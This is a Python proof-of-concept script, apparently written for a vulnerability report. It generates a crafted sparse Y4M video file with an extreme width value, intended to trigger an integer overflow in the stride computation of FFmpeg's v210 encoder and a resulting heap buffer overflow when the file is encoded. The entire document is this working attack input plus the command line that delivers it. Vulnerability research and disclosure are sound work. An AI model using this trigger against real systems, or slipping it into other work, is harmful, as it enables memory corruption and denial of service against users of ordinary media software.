#!/usr/bin/env python3
"""
PoC generator for VULN 001: Integer Overflow in stride Computation
Leading to Heap Buffer Overflow in v210 Encoder (v210enc.c lines 72-78)

Attack vector: crafted Y4M file with width=536870929 passed to ffmpeg -c:v v210
"""
import os
import sys

width = 536870929
height = 1

# Y4M header with YUV422P (C422) to match v210 encoder's expected input
header = f"YUV4MPEG2 W{width} H{height} F1:1 Ip A1:1 C422\n".encode()
frame_header = b"FRAME\n"

# Frame data size for yuv422p:
# Y: width * height = 536870929 bytes
# U: ceil(width/2) * height = 268435465 bytes
# V: same
frame_size = width * height + 2 * (((width + 1) // 2) * height)

outfile = os.path.join(os.path.dirname(__file__), "vuln_001_input.y4m")
print(f"Attempting to create sparse Y4M file: {outfile}")
print(f"  width={width}, height={height}")
print(f"  frame_size={frame_size} bytes (~{frame_size/1e9:.2f} GB)")
print(f"  Total file size (header+frame): ~{(len(header)+len(frame_header)+frame_size)/1e9:.2f} GB (sparse)")

try:
    with open(outfile, "wb") as f:
        f.write(header)
        f.write(frame_header)
        # Create sparse file: seek to last byte and write a single null byte
        # Intermediate bytes read as zero (from OS sparse file support)
        f.seek(len(header) + len(frame_header) + frame_size - 1)
        f.write(b'\x00')
    actual_size = os.path.getsize(outfile)
    print(f"Created {outfile}: logical size={actual_size} bytes")
except Exception as e:
    print(f"ERROR creating file: {e}", file=sys.stderr)
    sys.exit(1)
